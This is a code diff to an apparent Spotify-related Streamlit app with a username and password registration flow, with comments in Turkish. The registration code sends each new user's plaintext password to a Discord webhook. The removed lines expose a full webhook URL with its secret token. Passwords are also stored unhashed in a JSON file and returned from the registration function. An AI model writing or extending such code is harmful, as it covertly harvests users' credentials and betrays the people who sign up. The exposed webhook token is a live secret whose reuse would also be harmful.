@@ -15,7 +15,7 @@ st.set_page_config(page_title="KXNEKIPASA", layout="wide")
 load_dotenv()
 client_id = os.getenv("SPOTIFY_CLIENT_ID")
 client_secret = os.getenv("SPOTIFY_CLIENT_SECRET")
-WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1394242204628946974/6CZf6_OXWY5SLXPZZm3DWd3Y3XER3eHIiuzvCVBNcS44DfrbGYloC8-XH4VuKxhgfhgV"
+WEBHOOK_URL = "https://canary.discord.com/api/webhooks/..."  # Webhook URL'ni buraya koy
 
 # --- Kullanıcı verisi
 USER_DB = "users.json"
@@ -47,7 +47,7 @@ def register_user(username, password):
     users[username] = {"password": password}
     save_users(users)
     send_webhook("Yeni Kayıt", username, password=password)
-    return True, {"username": username}
+    return True, {"username": username, "password": password}
 
 def login_user(username, password):
     users = load_users()
@@ -114,10 +114,13 @@ if not st.session_state.logged_in:
         if st.button("Kayıt Ol"):
             success, result = register_user(username, password)
             if success:
-                st.session_state.logged_in = True
-                st.session_state.user = result
-                st.success("✅ Kayıt başarılı! Giriş yapılıyor...")
-                st.experimental_rerun()
+                # Otomatik giriş sonrası login_user ile doğrula
+                success_login, _ = login_user(username, password)
+                if success_login:
+                    st.session_state.logged_in = True
+                    st.session_state.user = {"username": username}
+                    st.success("✅ Kayıt başarılı! Giriş yapılıyor...")
+                    st.experimental_rerun()
             else:
                 st.warning(result)
     
